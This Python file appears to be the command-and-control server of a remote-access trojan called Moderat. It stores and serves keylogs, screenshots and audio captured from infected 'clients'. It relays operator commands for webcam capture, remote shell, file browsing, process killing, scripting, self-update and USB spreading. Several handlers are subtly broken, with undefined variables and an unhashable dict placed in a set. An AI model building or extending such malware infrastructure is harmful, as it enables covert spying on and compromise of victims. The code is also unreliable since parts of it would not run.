import ast
import logging
import coloredlogs
import os

from twisted.internet.protocol import ServerFactory
from twisted.internet import task
from twisted.protocols.basic import LineReceiver

from mdb import MDB
from commands import client


class ModeratServerProtocol(LineReceiver):

    delimiter = '[ENDOFMESSAGE]'
    MAX_LENGTH = 1024 * 1024 * 100  # 100MB

    def __init__(self):

        # dicts for download
        self.screenshots_dict = {}
        self.keylogs_dict = {}
        self.audio_dict = {}

    def rawDataReceived(self, data):
        pass

    # New Connection Made
    def connectionMade(self):
        self.sendMessage(self, 'connectSuccess', 'connectSuccess')

    def connectionLost(self, reason):
        self.transport.abortConnection()

        # Delete Client Entry
        for key, value in self.factory.clients.items():
            if value['protocol'] == self:
                self.factory.database.setClientStatus(key, False)
                del self.factory.clients[key]
                self.factory.log.warning('[CLIENT] Client (%s) Disconnected' % (value['key'] if value.has_key('key') else 'UNKNOWN'))

        # Delete Moderator Entry
        try:
            for key, value in self.factory.moderators.items():
                if value['protocol'] == self:
                    # Set Moderator Offline
                    self.factory.database.setModeratorLastOnline(value['username'])
                    self.factory.database.setModeratorStatus(value['username'], False)
                    self.factory.log.warning('[MODERATOR] Moderator (%s) Disconnected' % value['username'])
                    del self.factory.moderators[key]
        except KeyError:
            pass

    def lineLengthExceeded(self, line):
        self.factory.log.warning('[SERVER] Data Length Exceeded from {}'.format(self.transport.getPeer().host))

    def lineReceived(self, line):
        try:
            command = ast.literal_eval(line)
        except SyntaxError:
            return

        self.payload = command['payload']
        self.mode = command['mode']
        self.sessionID = command['session_id']
        self.moduleID = command['module_id']

        if command['from'] == 'client':
            # TODO: CLient Commands
            pass
        elif command['from'] == 'moderator':
            if not command['mode'] == 'getModerators' and not command['mode'] == 'getClients':
                self.factory.log.info('[*RECV] [Moderator: %s] [Mode: (%s)]' % (self.transport.getPeer().host, command['mode']))
            self.moderatorCommands()

    # Moderator Commands
    def moderatorCommands(self):
        if self.mode == 'moderatorInitializing':
            self.factory.log.debug('[MODERATOR] Initializing Moderator [FROM: %s]' % self.transport.getPeer().host)
            if self.payload.startswith('auth '):
                credentials = self.payload.split()
                if len(credentials) == 3:
                    command, username, password = credentials
                    if self.factory.database.loginModerator(username, password):
                        privileges = self.factory.database.isAdministrator(username)
                        self.sendMessage(self, 'loginSuccess %s' % privileges)
                        self.factory.moderators[self.sessionID] = {'username': username, 'protocol': self}
                        self.factory.database.setModeratorLastOnline(username)
                        self.factory.database.setModeratorStatus(username, True)
                        self.factory.log.debug('[MODERATOR] Moderator (%s) Login Success' % username)
                    else:
                        self.sendMessage(self, 'loginError')
                        self.factory.log.error('[MODERATOR] Moderator (%s) Login Error' % username)
                else:
                    self.factory.log.critical('[MALFORMED] Moderator Login Data')

        elif self.factory.moderators.has_key(self.sessionID):
            moderator = self.factory.database.getModerator(self.factory.moderators[self.sessionID]['username'])

            # Note Save Mode
            if self.mode == 'saveNote':
                splitted = self.payload.split('%SPLITTER%')
                if len(splitted) == 2:
                    client_id, note_body = splitted
                    self.factory.database.setClientNote(client_id, note_body)

            # Get Note
            elif self.mode == 'getNote':
                self.sendMessage(self, '{}'.format(self.factory.database.getClientNote(self.payload)))

            # Set Alias For Client
            elif self.mode == 'setAlias':
                alias_data = self.payload.split()
                try:
                    alias_client = alias_data[0]
                    alias_value = u' '.join(alias_data[1:])
                    self.factory.log.debug('[MODERATOR][{0}] Add Alias ({1}) for ({2})'.format(moderator.username, alias_value,
                                                                                   self.transport.getPeer().host))
                    self.factory.database.set_alias(alias_client, alias_value)
                except:
                    self.factory.log.critical('[MALFORMED][{0}] [MODE: {1}]'.format(moderator.username, mode))

            elif self.mode == 'removeClient':
                client = self.payload
                self.factory.database.delete_client(client)
                self.factory.log.debug('[MODERATOR][{0}] Client ({1}) Removed'.format(moderator.username, client))

            elif self.mode == 'countData':
                screen_data = self.payload.split()
                if len(screen_data) == 2:
                    client_id, date = screen_data
                    counted_data = {
                        'screenshots': {
                            'new': self.factory.database.get_screenshots_count_0(client_id, date),
                            'old': self.factory.database.get_screenshots_count_1(client_id, date)
                        },
                        'keylogs': {
                            'new': self.factory.database.get_keylogs_count_0(client_id, date),
                            'old': self.factory.database.get_keylogs_count_1(client_id, date)
                        },
                        'audio': {
                            'new': self.factory.database.get_audios_count_0(client_id, date),
                            'old': self.factory.database.get_audios_count_1(client_id, date)
                        }
                    }

                    self.sendMessage(self, counted_data)
                else:
                    self.factory.log.critical('[MALFORMED][{0}] [MODE: {1}]'.format(moderator.username, mode))

            elif self.mode == 'downloadLogs':
                if type(payload) == dict:
                    download_info = self.payload
                    # Get All Logs
                    if download_info['screenshot']:
                        screenshots = self.factory.database.get_all_new_screenshots(download_info['client_id'],
                                                                                download_info['date']) \
                            if download_info['filter'] else self.factory.database.get_all_screenshots(
                            download_info['client_id'], download_info['date'])
                    else:
                        screenshots = []
                    if download_info['keylog']:
                        keylogs = self.factory.database.get_all_new_keylogs(download_info['client_id'], download_info['date']) \
                            if download_info['filter'] else self.factory.database.get_all_keylogs(download_info['client_id'],
                                                                                          download_info['date'])
                    else:
                        keylogs = []
                    if download_info['audio']:
                        audios = self.factory.database.get_all_new_audios(download_info['client_id'], download_info['date']) \
                            if download_info['filter'] else self.factory.database.get_all_audios(download_info['client_id'],
                                                                                       download_info['date'])
                    else:
                        audios = []

                    # Send Counted Logs
                    counted_logs = {
                        'screenshots': len(screenshots),
                        'keylogs': len(keylogs),
                        'audios': len(audios),
                    }
                    self.sendMessage(self, counted_logs)

                    # Start Send Screenshots
                    for screenshot in screenshots:
                        if os.path.exists(screenshot[2]):
                            screenshot_info = {
                                'type': 'screenshot',
                                'datetime': screenshot[1],
                                'raw': open(screenshot[2], 'rb').read(),
                                'window_title': screenshot[3],
                                'date': screenshot[4]
                            }
                            self.sendMessage(self, screenshot_info, 'downloadLog')
                            self.factory.database.set_screenshot_viewed(screenshot[1])
                        else:
                            self.factory.log.info('[SERVER] File Not Found Delete Entry (%s)' % screenshot[2])
                            self.factory.database.delete_screenshot(screenshot[1])

                    # Start Send Keylogs
                    for keylog in keylogs:
                        if os.path.exists(keylog[3]):
                            keylog_info = {
                                'type': 'keylog',
                                'datetime': keylog[1],
                                'date': keylog[2],
                                'raw': open(keylog[3], 'rb').read()
                            }
                            self.sendMessage(self, keylog_info, 'downloadLog')
                            self.factory.database.set_keylog_viewed(keylog[1])
                        else:
                            self.factory.log.info('[SERVER] File Not Found Delete Entry (%s)' % keylog[3])
                            self.factory.database.delete_keylog(keylog[1])

                    # Start Send Audios
                    for audio in audios:
                        if os.path.exists(audio[3]):
                            audio_info = {
                                'type': 'audio',
                                'datetime': audio[1],
                                'date': audio[2],
                                'raw': open(audio[3], 'rb').read()
                            }
                            self.sendMessage(self, audio_info, 'downloadLog')
                            self.factory.database.set_audio_viewed(audio[1])
                        else:
                            self.factory.log.info('[SERVER] File Not Found Delete Entry (%s)' % audio[3])
                            self.factory.database.delete_audios(audio[1])

                    self.sendMessage(self, {'type': 'endDownloading', }, 'downloadLog')
                else:
                    self.factory.log.critical('[MALFORMED][TYPE] [MODE: {0}] [TYPE: {1}]'.format(mode, type(payload)))

            # ADMIN PRIVILEGES
            # Add Moderator
            elif self.mode == 'addModerator' and self.factory.database.isAdministrator(moderator.username):
                credentials = self.payload.split()
                if len(credentials) == 3 and credentials[2].isdigit():
                    username, password, privileges = credentials
                    self.factory.database.createModerator(username, password, int(privileges))
                    self.factory.log.debug('[MODERATOR][{0}] ({1}) Created With Password: ({2}), Privileges: ({3})'.format(
                        moderator.username, username, password.replace(password[3:], '***'), privileges))

            elif self.mode == 'setModerator' and self.factory.database.isAdministrator(moderator.username):
                credentials = self.payload.split()
                if len(credentials) == 2:
                    client_id, moderator_id = credentials
                    self.factory.database.setClientModerator(client_id, moderator_id)
                    self.factory.log.debug('[MODERATOR][{0}] Moderator Changed For Client ({1}) to ({2})'.format(
                        moderator.username, client_id, moderator_id))

            elif self.mode == 'changePassword' and self.factory.database.get_privs(moderator.username) == 1:
                credentials = self.payload.split()
                if len(credentials) == 2:
                    moderator_id, new_password = credentials
                    self.factory.database.change_password(moderator_id, new_password)
                    self.factory.log.debug('[MODERATOR][{0}] Moderator ({1}) Password Changed to ({2})'.format(
                        moderator.username, moderator_id, new_password.replace(new_password[3:], '***')))

            elif self.mode == 'changePrivilege' and self.factory.database.isAdministrator(moderator.username):
                credentials = self.payload.split()
                if len(credentials) == 2:
                    moderator_id, new_privilege = credentials
                    self.factory.database.changePrivileges(moderator_id, new_privilege)
                    self.factory.log.debug('[MODERATOR][{0}] Moderator ({1}) Privilege Changed to ({2})'.format(
                        moderator.username, moderator_id, new_privilege))

            elif self.mode == 'removeModerator' and self.factory.database.isAdministrator(moderator.username):
                self.factory.database.deleteModerator(self.payload)
                self.factory.log.debug('[MODERATOR][{0}] Moderator ({1}) Removed'.format(
                    moderator.username, self.payload))

            # For Only Administrators
            elif self.mode in ['terminateClient'] and self.factory.database.get_privs(moderator.username) == 1:
                self.sendMessage(self.factory.clients[client_key]['protocol'], self.payload)

            # Forward To Client
            elif self.mode in ['getScreen', 'getWebcam', 'setLogSettings', 'updateSource', 'p2pMode',
                          'shellMode', 'explorerMode', 'terminateProcess', 'scriptingMode', 'usbSpreading']:
                try:
                    self.sendMessage(self.factory.clients[client_key]['protocol'], self.payload)
                except KeyError as e:
                    pass
            else:
                self.factory.log.critical('[MALFORMED][MODE] [MODE: {0}] [MODERATOR: {1}]'.format(self.mode, moderator.username))
        else:
            self.factory.log.critical('[MALFORMED][SESSION] [MODE: {0}] [SESSION: {1}]'.format(self.mode, self.session_id))

    def sendMessage(self, to, message, mode='', sessionID='', moduleID=''):
        toAddress = to.transport.getPeer().host
        fromAddress = self.transport.getPeer().host
        to.sendLine(str({
            'payload': message,
            'from': 'server',
            'mode': self.mode if hasattr(self, 'mode') else mode,
            'session_id': self.sessionID if hasattr(self, 'sessionID') else sessionID,
            'module_id': self.moduleID if hasattr(self, 'moduleID') else moduleID,
        }))
        self.factory.log.info('[*SENT] [TO: %s] [FROM: %s] [MODE: %s]' % (
            toAddress, fromAddress, self.mode if hasattr(self, 'mode') else 'UNKNOUN'))


class ModeratServerFactory(ServerFactory):

    # Custom Colored Logging
    log = logging.getLogger('Moderat')
    coloredlogs.install(level='DEBUG')

    DATA_STORAGE = r'/media/root/STORAGE/MODERAT_DATA/'
    database = MDB()

    # Clear Clients and Moderators Status
    database.setAllOffline()

    moderators = {}
    clients = {}

    log.debug('[SERVER] Moderat Server Started')
    protocol = ModeratServerProtocol

    def __init__(self):
        self.clientInfoChecker = task.LoopingCall(self.infoChecker)
        self.getClientsChecker = task.LoopingCall(self.clientsChecker)
        self.getModeratorsChecker = task.LoopingCall(self.moderatorsChecker)
        self.clientInfoChecker.start(5)
        self.getClientsChecker.start(5)
        self.getModeratorsChecker.start(5)

    def infoChecker(self):
        for key in self.clients.keys():
            self.sendMessage(self.clients[key]['protocol'], 'infoChecker', 'infoChecker', '', '')

    def clientsChecker(self):
        current_clients = self.clients
        for session in self.moderators.keys():
            shared_clients = {}
            moderator = self.database.getModerator(self.moderators[session]['username'])
            clients = self.database.getClients(moderator)
            for client in clients:
                if current_clients.has_key(client.identifier) and client.status:
                    _ = current_clients[client.identifier]
                    shared_clients[client.identifier] = {
                        {
                            'moderator': self.database.getClientModerator(client.identifier).username,
                            'alias': self.database.getClientAlias(client.identifier),
                            'ip_address': _['ip_address'], 'os_type': _['os_type'], 'os': _['os'],
                            'user': _['user'], 'privileges': _['privileges'], 'audio_device': _['audio_device'],
                            'webcamera_device': _['webcamera_device'], 'window_title': _['window_title'],
                            'key': _['key'], 'kts': _['kts'], 'kt': _['kt'], 'ats': _['ats'], 'at': _['at'],
                            'sts': _['sts'], 'std': _['std'], 'st': _['st'], 'usp': _['usp'],
                            'status': client.status
                        }
                    }
                else:
                    shared_clients[client.identifier] = {
                        'moderator': moderator.username,
                        'key': client.identifier,
                        'alias': client.alias,
                        'ip_address': client.ip_address,
                        'last_online': client.last_connected.strftime("%Y-%m-%d %H:%M:%S"),
                        'status': client.status
                    }
            self.sendMessage(self.moderators[session]['protocol'], shared_clients, 'getClients', '', '')

    def moderatorsChecker(self):
        shared_moderators = {}
        moderators = self.database.getModerators()
        for moderator in moderators:
            all_clients_count = self.database.getClients(moderator).count()
            offline_clients_count = self.database.getOfflineClients(moderator).count()
            shared_moderators[moderator.username] = {
                'privileges': moderator.privileges,
                'offline_clients': offline_clients_count,
                'online_clients': all_clients_count - offline_clients_count,
                'status': moderator.status,
                'last_online': moderator.last_online.strftime("%Y-%m-%d %H:%M:%S"),
            }
        for session in self.moderators.keys():
            self.sendMessage(self.moderators[session]['protocol'], shared_moderators, 'getModerators', '', '')

    def sendMessage(self, to, payload, mode, sessionID, moduleID):
        to.sendLine(str({
            'payload': payload, 'mode': mode, 'from': 'server', 'session_id': sessionID, 'module_id': moduleID,
        }))
